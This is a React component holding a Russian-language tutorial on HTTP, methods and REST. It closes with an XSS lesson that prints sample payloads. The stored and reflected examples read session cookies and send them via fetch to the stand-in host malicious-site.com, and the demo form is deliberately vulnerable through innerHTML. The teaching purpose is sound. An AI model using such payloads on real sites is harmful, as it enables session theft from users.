import React from 'react';

function Networking() {

  return (
    <section className="conspect">
      <h1>Работа с сетью</h1>

      <h2>Протокол HTTP</h2>
      <p>HTTP — это сетевой протокол прикладного уровня, то есть для «общения» между программами. Протокол появился в начале 90-х и применяется до сих пор. Аббревиатура HTTP расшифровывается как «HyperText Transfer Protocol» (протокол передачи гипертекста).</p>
      <p>У этого протокола есть несколько версий. На сегодняшний день актуальными являются 1.1. и 2.0. Окончательная спецификация второй версии появилась лишь в 2015 году и уже идут работы над третьей версией.</p>
      <p>Вся информация о любых протоколах представлена в документах RFC (Request for Comments). Протокол HTTP не является исключением. Полные сведения о первой версии протокола детально описаны в RFC2616.</p>
      <p>Изначально протокол HTTP проектировался для передачи гипертекста (вспомните расшифровку аббревиатуры). Однако сегодня он используется и в качестве транспорта для передачи информации другими протоколами прикладного уровня. Такие протоколы как XML-RPC, WebDav, WS могут использовать HTTP в качестве транспорта.</p>
      <img src="public/protocols.png" alt="Транспортные и прикладные протоколы" />

      <h3>Принцип работы</h3>
      <p>С HTTP-протоколом мы сталкиваемся постоянно — на нём держится всемирная паутина. Всякий раз при переходе на любой веб-сайт, применяется именно HTTP-протокол. Браузер использует его для взаимодействия с сервером.</p>
      <p>Возможно вы этого не замечали: название протокола вводится вместе с адресом сайта. Современные браузеры не требуют исполнения этого правила. Более того, по умолчанию они скрывают применяемый протокол. Обратите внимание на адресную строку. В ней отображается адрес ресурса без указания протокола. Однако, если кликнуть в адресную строку, то адрес отобразится полностью, включая протокол.</p>
      <p>Напомним: HTTP-протокол решает задачу обмена данными. Участники обмена: сервер и клиент. Клиент (например, браузер) формирует запрос и отправляет его серверу. Сервер (программа веб-сервер) получает запрос, анализирует и возвращает ответ. Клиент, получив ответ, обрабатывает его и выполняет какое-то действие. Например, отрисовывает страницу.</p>
      <img src="public/http-in-action.png" alt="HTTP в действии" />
      <p>Общий принцип должен быть понятен, но как именно браузер соединяется с сервером? Ведь на сервере могут быть запущены сотни приложений, которые принимают соединения. Как браузер находит именно веб-сервер?</p>
      <p>Когда вы вводите адрес сайта в адресной строке и нажимаете Enter, происходит примерно следующее (рассматриваем максимально упрощённый сценарий):</p>
      <ul>
        <li>Чтобы соединиться с сервером, браузеру необходимо получить его IP-адрес. Мы привыкли пользоваться символьными адресами — их проще запомнить, чем сочетание цифр. Программы наоборот, предпочитают числа. После ввода в адресной строке htmlacademy.ru, первой задачей браузера станет получение IP адреса для htmlacademy.ru. Для этого он выполнит запрос к DNS-серверу, который на основании символьного адреса вернёт IP-адрес — 178.79.181.169.* Получив IP-адрес, браузер попытается установить соединение с сервером. Для этого он воспользуется протоколом транспортного уровня — TCP. На сервере может быть запущено множество сервисов, но браузер по умолчанию подключится к 80-му порту. Почему именно к нему — расскажем позже.</li>
        <li>Установив соединение, браузер сформирует HTTP-запрос и передаст его серверу. Здесь и вступает в работу протокол HTTP. Две программы, браузер и сервер, начинают «общаться». Браузер направляет запрос, а сервер — ответ. Запрос — это обычный текст, составленный в соответствии с правилами протокола. Запрос включает в себя служебную информацию и, самое главное, адрес ресурса, который требуется получить.</li>
      </ul>
      <p>Вернёмся к номеру порта. А почему браузер пытается установить соединение именно на 80-й порт? Как он определяет, что его ждут именно там? По умолчанию веб-серверы ожидают подключений именно на 80-м порту. Это договорённость.</p>
      <p>Это, конечно, не означает, что веб-сервер может работать только на 80-м порту. Администратор сервера может изменить правила игры и настроить веб-сервер для приёма соединений от клиентов на другой порт. Например, 3666.</p>
      <p>В этом случае порт необходимо указать самостоятельно при вводе адреса. Порт указывается после символа двоеточие (:). Например, если сервер htmlacademy.ru принимает соединения на порт 3666, то адрес станет таким: https://htmlacademy.ru:3666.</p>

      <h3>Отправка запросов</h3>
      <p>Само собой, браузер скрывает детали. Для вас всё сводится к вводу адреса и получению результата (готовой страницы). Как выглядит сам HTTP-запрос вы не знаете, но это легко исправить, посмотрев вкладку «Network» (сеть) в инструментах разработчика. На четвёртом рисунке красными стрелками отмечен HTTP-запрос https://htmlacademy.ru. Ниже мы покажем как составить и выполнить такой запрос самостоятельно.</p>
      <p>Попробуем немного побыть в роли браузера и самостоятельно отправим HTTP-запрос. Вручную. Для этого потребуется лишь консольная утилита telnet. Она входит в состав всех операционных систем.</p>
      <p>Важно! Если вы используете операционную систему от Microsoft, то приложение telnet может отсутствовать по умолчанию. В этом случае необходимо установить этот компонент в операционной системе. Эта операция выполняется с помощью апплета «Программы и компоненты». Он доступен в «Панели управления». В качестве более продвинутой альтернативы для Windows, можно воспользоваться приложением PuTTY. Оно лишено ограничений устаревшего telnet.</p>
      <p>Важно! В последних версиях macOS приложение telnet также недоступно по умолчанию, но его легко установить с помощью пакетного менеджера brew. Для установки выполните brew install telnet.</p>
      <p>Запустите терминал и выполните команду: telnet htmlacademy.ru 80. Обратите внимание, используется символьный адрес ресурса. Следовательно, сначала автоматически выполнится DNS-запрос для получения IP-адреса, а только потом начнётся попытка установки соединения с сервером.</p>
      <p>После установки соединения, необходимо отправить HTTP-запрос. Запрос состоит из нескольких частей: строка запроса (request line), заголовки (headers, служебная информация) и тело запроса (body). Тело запроса необходимо не во всех случаях.</p>
      <img src="public/http-method.png" alt="Структура HTTP-запроса" />
      <p>В строке запроса указывается HTTP-метод. Протокол HTTP определяет перечень методов. Метод позволяет серверу понять, как следует обрабатывать этот запрос. После метода следует строка запроса (query string), название и версия протокола.</p>
      <p>Не будем углубляться в детали, а попробуем составить запрос с применением метода HEAD. Это один из самых простых в понимании методов. Он позволяет запросить у сервера только заголовки — служебную информацию, без контента.</p>
      <p>Более распространённым является метод GET. Браузер каждый раз использует его, когда запрашивает страницу с сервера или какие-нибудь ресурсы. Мы воспользуемся методом HEAD ради упрощения примера. Он вернёт всё ту же служебную информацию, что и GET, только без контента — кода страницы.</p>
      <p>А зачем может потребоваться выполнять такой запрос, если сервер не вернёт контент? Метод HEAD пригодится для предварительной подготовки. Например, узнать размер контента, который придётся загрузить, выполнив метод GET.</p>
      <p>Попробуем составить запрос, с применением метода HEAD. Выше мы отметили, http-запрос — это просто текст. Вернитесь в терминал. Если соединение с сервером пропало — не переживайте. Это абсолютно нормальная ситуация. Сервер разрывает соединение, если оно не используется n-секунд. В такой ситуации следует повторно подключиться к серверу. После подключения, опишите запрос, придерживаясь схемы: &lt;HTTP-метод&gt; &lt;URI&gt; &lt;Протокол&gt;/&lt;Версия&gt;:</p>
      <pre>{`HEAD / HTTP/1.1
Host: htmlacademy.ru`}
      </pre>
      <p>После ввода текста запроса, дважды нажмите клавишу Enter. Ввод подряд двух символов перевода каретки объяснит серверу, что текст запроса завершён и можно приступать к обработке. Сервер вернёт ответ и разорвёт соединение или наоборот, оставит активным:</p>
      <pre>{`HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Thu, 31 Dec 2019 14:17:13 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: https://htmlacademy.ru/`}
      </pre>
      <p>Поздравляем, вы выполнили первый HTTP-запрос в терминале. Как видите, в этом нет ничего сложного. Обратите внимание, после выполнения запроса сервер самостоятельно разорвал соединение. Если требуется выполнить ещё один запрос, придётся повторить всю процедуру заново.</p>
      <p>Разберём ответ сервера. В первой строке определена версия протокола (HTTP/1.1), код состояния (status code) и поясняющий текст. Эту строку принято называть «строка состояния» (status line).</p>

      <h3>Коды состояний</h3>
      <p>Код состояния состоит из трёх цифр. Первая цифра определяет класс состояния, а две последующие — статус выполнения операции. Спецификация определяет 5 классов состояний:</p>
      <ul>
        <li>1 — информационные (informational);</li>
        <li>2 — успешно (success);</li>
        <li>3 — перенаправление (redirection);</li>
        <li>4 — ошибка клиента (client error);</li>
        <li>5 — ошибка сервера (server error).</li>
      </ul>
      <p>За кодом состояния следует строка с пояснительным текстом. Он поможет узнать информацию о выполнении операции, не вспоминая, что же означает код состояния. Например:</p>
      <ul>
        <li>200 OK — запрос выполнен успешно;</li>
        <li>404 Not Found — страница/ресурс не найден.</li>
      </ul>
      <p>В нашем случае сервер вернул код 301 (перенаправление), а в строке с пояснением — Moved Permanently (перемещено навсегда). Это означает, что запрашиваемый ресурс перемещён и доступен по другому адресу. Какому? Ответ содержится в заголовке Location. В нём указан новый адрес ресурса. Обратите внимание, в качестве нового адреса указан https://htmlacademy.ru. Вместо http применяется https — безопасная версия протокола.</p>

      <h3>HTTP и HTTPS</h3>
      <p>HTTPS — это расширение протокола HTTP, а не самостоятельный протокол. Оно добавляет поддержку шифрования трафика, то есть повышает безопасность. Аббревиатура расшифровывается так: HyperText Transfer Protocol Secure — безопасный протокол передачи гипертекста. Соединение, установленное через HTTPS, шифруется. Таким образом, смысл в перехвате трафика теряется.</p>
      <p>Детально рассматривать HTTPS не будем. Более подробная информация доступна в этой статье. Акцентируем внимание лишь на порт.</p>
      <p>Вы знаете: по умолчанию веб-сервер ожидает подключение на 80-й порт. Эта договорённость справедлива для протокола HTTP. А для HTTPS-соединений действует другое правило: веб-серверы ожидают безопасные подключения по умолчанию на 443 порту.</p>
      <p>Например, чтобы выполнить HEAD / метод для https://htmlacademy.ru, нам необходимо установить соединение с 443 портом вместо 80-го (в telnet этот пример не воспроизведётся).</p>
      <p>Сервер ответил кодом 301, сообщив о новом расположении ресурса. Напомним, новое расположение фиксируется в заголовке Location. В ответе заголовков может быть большое количество. Они помогают клиенту правильно обработать ответ. Разберём заголовки из ответа:</p>
      <ul>
        <li>Server: nginx. Содержит информацию о веб-сервере. В данном случае использует веб-сервер nginx — самый популярный веб-сервер;</li>
        <li>Date: Thu, 31 Dec 2019 14:17:13 GMT. Дата ответа;</li>
        <li>Content-Type: text/html. Тип содержимого, которое вернёт сервер для запроса.</li>
        <li>Content-Length: 178. Размер содержимого в байтах.</li>
        <li>Connection: keep-alive. Определяет останется ли соединение открытым после выполнения запроса. Значение close подразумевает, что соединение будет закрыто, а keep-alive — наоборот — останется открытым. Зависит от версии протокола.</li>
      </ul>
      <p>Для GET запроса сервер вернёт дополнительно HTML-код страницы (если ресурс существует). Другие виды запросов выполняются аналогичным образом.</p>

      <h2>Полезные инструменты</h2>
      <p>Для выполнения и проверки HTTP-запросов необязательно применять терминал. Мы рассмотрели этот вариант для наглядности. Выполнять запросы по протоколу HTTP (S) удобно при помощи расширения REST Client для редактора Visual Studio Code.</p>
      <p>Расширение позволяет создавать и выполнять запросы прямо в текстовом редакторе. Рассмотрим пример. Установите расширение и создайте новый файл в с расширением .http. После этого можно приступать к написанию запросов. Структура запросов точно такая же:</p>
      <pre>{`<HTTP-Метод> <URI> <Протокол>/<Версия>'
<Headers>`}
      </pre>
      <p>Попробуем описать ранее рассмотренный HEAD-запрос. После описания запроса появится кнопка «Send request» (отправить запрос). Нажмите её. Результат выполнения запроса откроется в отдельном окне.</p>
      <pre>{`HEAD https://htmlacademy.ru HTTP/1.1
User-Agent: "Mozilla/5.0"`}
      </pre>

      <h2>Типы HTTP-запросов</h2>
      <p>Первое слово в первой строке любого HTTP-запроса — это его тип (ещё его называют «методом»). Вот он, GET, в начале:</p>
      <pre>{'GET /index.html HTTP/1.1'}</pre>

      <h3>HTTP-методы для чтения</h3>
      <ul>
        <li>
          <h4>GET</h4>
          <p>Запрос на получение информации с сервера. Это может быть HTML-разметка, CSS-файл, изображение, видео, аудио, JSON-данные или другие ресурсы.</p>
        </li>
        <li>
          <h4>HEAD</h4>
          <p>Запрос для проверки, обновилась ли информация на сервере, и стоит ли заново её скачать, или можно взять версию из кэша.</p>
          <p className="hl-8">Кэширование — подход, заключающийся в сохранении копии полученного ресурса, чтобы вернуть её по запросу, не загружая повторно с сервера. <a className="hl-8" href="https://developer.mozilla.org/ru/docs/Web/HTTP/Caching" target="_blank" rel="noopener noreferrer">Подробнее на MDN</a></p>
          <h5>Зачем нужен такой запрос?</h5>
          <p>Представьте, что вам нужно загрузить видео весом в несколько гигабайт. В первый раз его всё равно придётся загрузить, и браузер сам после загрузки отправит видео в кэш (браузер умный, он экономит ресурсы).</p>
          <p>Но надо ли загружать видео ещё раз? Как понять, что оно не изменилось? Для этого и нужен запрос HEAD.</p>
          <p>В случае запроса HEAD сервер вернёт нам в ответ только заголовки, где содержится подробная информация о ресурсе. По заголовкам можно понять, что видео не изменилось, а значит браузер может отдать его пользователю при повторных запросах из кэша, что будет в разы быстрее, чем снова грузить несколько гигабайт.</p>
        </li>
        <li>
          <h4>OPTIONS</h4>
          <p>Запрос для проверки, какие запросы можно делать к ресурсу.</p>
          <p>У сервера бывает очень много ресурсов, то есть адресов, к которым можно делать запросы. OPTIONS-запрос существует как раз для того, чтобы получить список методов, с помощью которых вы можете запрашивать информацию по данному адресу.</p>
          <p>Например, изображение пользователя на сервере поддерживает только запросы GET и HEAD, потому что картинка «доступна только для чтения». А имя пользователя на сервере кроме GET и HEAD может поддерживать ещё POST и PUT, чтобы была возможность установить или изменить имя.</p>
        </li>
      </ul>
      <h3>HTTP-методы для записи</h3>
      <ul>
        <li>
          <h4>POST</h4>
          <p>Запрос на создание новой записи на сервере. Один из немногих запросов к серверу, который обязательно должен содержать тело.</p>
          <p>Представим, что вы заполнили форму нового комментария. Как отправить этот комментарий на сервер? Сделать запрос POST!</p>
        </li>
        <li>
          <h4>PUT</h4>
          <p>Запрос на перезапись существующей информации на сервере.</p>
          <p>Представим, что вы хотите изменить свой комментарий. Полностью. Для этого нужно сделать запрос PUT с новым комментарием (новой информацией). Он полностью заменит предыдущий комментарий на сервере.</p>
        </li>
        <li>
          <h4>PATCH</h4>
          <p>Запрос на частичную перезапись существующей информации на сервере.</p>
          <p>Представим, что вы опечатались в имени комментатора из прошлого примера. Как изменить только имя, а не гонять туда-сюда большой текст комментария? Представьте, что он ещё и с картинками.</p>
        </li>
        <li>
          <h4>DELETE</h4>
          <p>Запрос на удаление существующей информации на сервере.</p>
        </li>
      </ul>
      <h2>Принципы взаимодействия</h2>
      <p>Программисты в прошлом создали наборы правил по взаимодействию клиента и сервера. Таких наборов правил много, рассмотрим только один из самых популярных, который называется REST.</p>

      <h3><abbr data-title="Representational State Transfer, дословно «передача состояния представления»">REST</abbr></h3>
      <p>Любая работа с данными рано или поздно приводится к системе CRUD: Create, Read, Update, Delete — набору методов для создания, чтения, обновления и удаления информации. Если переложить CRUD на HTTP, то получим методы POST, GET, PUT/PATCH, DELETE соответственно.</p>
      <p>Давайте обратимся к примеру из прошлых статей и рассмотрим, как по REST может быть организована работа с комментариями:</p>
      <pre>{`# Для создания комментария нужно отправить POST-запрос с телом на /comments
POST    /comments

# Для получения комментария нужно отправить GET-запрос на /comments/:id:
GET     /comments/1

# Для обновления комментария нужно отправить
# PUT-запрос с обновленным ресурсом на /comments/:id:
# PATCH-запрос с обновлением на /comments/:id:
PUT     /comments/1
PATCH   /comments/1

# Для удаления комментария нужно отправить DELETE-запрос на /comments/:id:
DELETE  /comments/1`}
      </pre>

      <h4>Адреса — бизнес-логика</h4>
      <p>Поэтому от сайта к сайту адреса по REST могут и будут отличаться. REST не гарантирует, что на каждом сайте комментарии можно получить по адресу /comments/:id:, REST гарантирует, что получить комментарий можно с помощью GET, обновить с помощью PATCH, а удалить с помощью DELETE по одному адресу, например, /comments/:id:.</p>

      <h4>Где взять список доступных адресов?</h4>
      <p>Представим, что и сервер, и клиент готовы работать по REST. Возникает вопрос, а как вам, как фронтендеру, добыть список адресов и поддерживаемых методов? Есть несколько вариантов.</p>
      <ol>
        <li>Спросить у разработчика сервера</li>
        <li>
          <h5>Написать самому (тонкий бэкенд)</h5>
          <p>Тонкий бэкенд — это такая прослойка, обычно на Node.js, между клиентом и сервером. Задача такой прослойки — обрабатывать запросы от клиента и перенаправлять их дальше. Вся логика по работе с базами данных и прочими хранилищами остаётся на сервере.</p>
          <p>В таком случае вы сами придумываете и описываете адреса, поддержку HTTP-методов и логику перенаправления запроса к серверу.</p>
        </li>
        <li>
          <h5>Прочитать документацию к API</h5>
          <p>Этот подход не отменяет двух предыдущих, а вбирает в себя их. Вместо того, чтобы отвечать на вопросы, разработчик сервера документирует все доступные ресурсы на сервере.</p>
          <p>Application programming interface (API) — описание способов, которыми клиент может взаимодействовать с сервером в нашем случае. <a href="https://ru.wikipedia.org/wiki/API" target="_blank" rel="noopener noreferrer">Подробнее на Википедии.</a></p>
        </li>
      </ol>

      <h2>Безопасность. XSS (Cross-site-scripting)</h2>
      <p>Аббревиатура XSS расшифровывается как Cross-Site Scripting (межсайтовый скриптинг). Если особо не погружаться в детали, смысл атаки заключается во внедрении вредоносного кода в страницу. Атака не затрагивает серверную часть, но напрямую влияет на клиентскую — на пользователей уязвимого сервиса.</p>
      <p>А какой код можно внедрить в страницу? У страницы же нет доступа к базе данных или другому серверному компоненту, где можно получить данные пользователей. Речь идёт о JavaScript-коде. Зловредном коде.</p>
      <p>Вам хорошо известно: для выполнения JavaScript-кода на странице (в контексте фронтенда) необходимо разместить его между тегами &lt;script&gt;&lt;/script&gt;. Про этот способ мы рассказывали в первой главе учебника. Атака XSS в этом и заключается. Злоумышленник внедряет в страницу зловредный JavaScript-код. Пользователь переходит на эту страницу, код выполняется и конфиденциальные данные пользователя отправляются злоумышленнику.</p>
      <p>На практике это может выглядеть так. Представьте персональный блог — вы его разрабатываете в рамках личного проекта. Все зарегистрированные пользователи могут оставлять комментарии к публикациям.</p>
      <p>Всё работает прекрасно, пока не появляется пользователь, который хочет не просто обсуждать публикации, а украсть доступ к учётным записям других пользователей блога. Для этого злоумышленник в поле комментарий пишет какой-то текст, тег &lt;script&gt;, а в нём немного JavaScript-кода. Если не происходит никакой фильтрации, то после публикации такого комментария, код будет выполняться у всех пользователей, посетивших страницу.</p>
      <p>А что опасного может быть в этом коде? Часто разработчики используют cookie для хранения идентификатора сессии пользователя. Что такое идентификатор? Это строка с уникальным набором символов, позволяющих отличить одного авторизованного пользователя от другого.</p>
      <p>Зловредный код может прочитать это значение и передать на сервер злоумышленника при помощи Ajax-запроса. В этом и заключается смысл XSS-атаки. Собрав такие идентификаторы, злоумышленник может подставить их себе. Если разработчик не предусмотрел дополнительной защиты, то злоумышленник сможет войти в приложение под учётной записью пользователя.</p>
      <p>Рассмотренный сценарий выше — один из самых популярных, но не единственный. При отсутствии фильтрации, можно выполнить любой JavaScript-код. Например, собрать все данные со страницы (при помощи банальных querySelector) или сделать другие деструктивные действия.</p>

      <h3>XSS на примере</h3>
      <p>Попробуем взглянуть на проблему с практической точки зрения. Создадим демонстрационное приложение и на реальном примере узнаем, что подразумевается под XSS. В качестве демонстрационного приложения сделаем простую форму для ввода имени. Пользователь вводит имя, отправляет форму, и в параграфе появляется текст с приветствием пользователя. Приложение максимально простое, но оно прекрасно проиллюстрирует проблему:</p>
      <pre>{`<form id="basic-form">
    <input id="user-name" type="text">
    <input type="submit" value="Отправить" placeholder="Пожалуйста, представьтесь">
    <p id="welcome-user"></p>
</form>

<script>
    'use strict';

    const submitFormHandler = (evt) => {
        evt.preventDefault();
        welcomeUserElement.innerHTML = 'Привет, {userNameElement.value}!';
    }

    const formElement = document.querySelector('#basic-form');
    const welcomeUserElement = formElement.querySelector('#welcome-user');
    const userNameElement = formElement.querySelector('#user-name');

    formElement.addEventListener('submit', submitFormHandler);
</script>`}
      </pre>
      <p>Попробуйте открыть страницу в браузере и протестировать приложение. Убедитесь, что всё работает так, как и было запланировано. Приложение работает так, как мы и ожидаем. Теперь давайте вместо имени введём на первый взгляд безобидную строку:</p>
      <pre>{`<img src="" onerror="alert('xss')">`}</pre>
      <p>Нажмите кнопку «Отправить». На этот раз в параграфе #welcome-user отобразится «Привет, !», но в довесок к этому вы увидите модальное окно с текстом «xss». Мы внедрили в страницу сторонний JavaScript-код. В примере он показывает бесполезное модальное окно, но вы понимаете, что он может делать намного больше. Выше мы обсуждали несколько негативных сценариев.</p>
      <p>Рассмотрим ещё один пример и разберёмся, как выглядит внедрение XSS изнутри. Представим, что вы разрабатываете какой-нибудь форум любителей аквариумных рыбок. Пусть схематично его разметка выглядит так:</p>
      <pre>{`<h1>Здравствуйте, <span class="username">Обычный Пользователь</span>!</h1>
<article class="topic">
	<header class="topic-header">
		<h2>Разведение пираний в домашних условиях</h2>
	</header>
	<p class="topic-body">
		Всем привет. Я решил завести себе пираний.
Расскажите, какие плюсы, минусы, подводные камни.</p>
    <footer class="posted-by">
        От <span class="poster-name">Другой Пользователь</span>
    </footer>
</article>`}
      </pre>
      <p>Простая разметка — ничего необычного. Один из пользователей, который создал эту тему для обсуждения выбрал при регистрации необычное имя. Вот такое:</p>
      <pre>{`Другой пользователь</span><script>const username=document.querySelector('.username').textContent;const sessionCookie=document.cookie.match(/session-token=([^;$]+)/)[1];fetch('http:/www.malicious-site.com',{method: 'post',body:JSON.stringify({username,sessionCookie})});</script>`}
      </pre>
      <p>Визуально на странице ничего не изменится. Всё то же безумное объявление, но это лишь на первый взгляд. Экзотичное имя пользователя (то самое с кодом) содержало закрывающий тег span. Выходит, что на этом описание элемента с именем пользователя заканчивается. За ним следует тег script c JavaScript кодом, который браузер вынужден исполнить.</p>
      <p>Выполнение этого кода приведёт к отправке идентификатора сессии на сервер злоумышленника (www.malicious-site.com). Получив идентификатор, злоумышленник сможет подставить его себе и войти в сервис от имени пользователя. Дальше можно изменить профиль (если сервис позволяет это сделать без ввода пароля) и сделать другие деструктивные действия.</p>

      <h3>Виды XSS</h3>
      <p>Существует два основных вида XSS-атак. Первый — хранимые XSS (Stored XSS). Его мы разобрали в предыдущем примере. Один пользователь вводит зловредные данные, которые сохраняются на сервере и оттуда попадают на страницу другого пользователя.</p>
      <img src="public/stored-xss.png" alt="stored-xss" />
      <p>Другой вид — отражённые XSS (Reflected XSS). Атаки этого типа выглядят иначе. Допустим, на форуме любителей рыбок есть поиск по сообщениям. Маршрут на страницу с выдачей результатов может выглядеть так:</p>
      <pre>{'http://www.aquarium-forum.com/search?q=guppy'}</pre>
      <p>При переходе пользователь увидит страницу примерно с такой разметкой:</p>
      <pre>{`<div class="query">
	Результаты поиска по запросу <span class="query-text">guppy</span>:
</div>
<div class="result">
	<!-- результаты поиска -->
</div>`}
      </pre>
      <p>Ничего необычного в этой разметке нет, но представьте, что один из пользователей форума любителей рыбок получит на свой email провокационное письмо: «Шокирующая правда о гуппи! Рыбки не переносят… (продолжение по ссылке)». Пользователь на эмоциях переходит по ней (он видит, что она ведёт на его любимый форум) и видит вполне ожидаемую страницу с результатами поиска. Только без шокирующих новостей, но идентификатор его сессии уже улетел злоумышленнику. Ссылка в письме выглядела так:</p>
      <pre>{`http://www.aquarium-forum.com/search?q=guppy<script>fetch('http:/www.malicious-site.com?cookie='+document.cookie)</script>`}
      </pre>
      <p>После перехода по ссылке, разметка страницы преобразилась и обзавелась одной строкой кода на JavaScript. Визуально это незаметно, но браузер выполнит код, который не предполагал разработчик:</p>
      <pre>{`<div class="query">
	Результаты поиска по запросу <span class="query-text">guppy
<script>
	fetch('http:/www.malicious-site.com?cookie=' + document.cookie);
</script>
</span>:
</div>
<div class="result">
	<!-- результаты поиска -->
</div>`}
      </pre>
      <img src="public/reflected-xss.png" alt="reflected-xss" />

      <h3>Защита от XSS</h3>
      <p>Основная причина появления XSS заключается в недостаточной фильтрации входных данных. Мы это видели на двух примерах. Давайте подумаем, как бороться с этой проблемой. Начнём с простого: не стоит вставлять пользовательские данные в свойство innerHTML.</p>
      <p>Если пользователь пришлёт разметку с кодом на JavaScript, то браузер интерпретирует код и станут возможны сценарии, о которых говорили выше. Что же делать? Самый простой вариант: вместо innerHTML применять innerText. Тогда содержимое будет отображаться как простой текст.</p>
    </section>
  );
}
export default Networking;
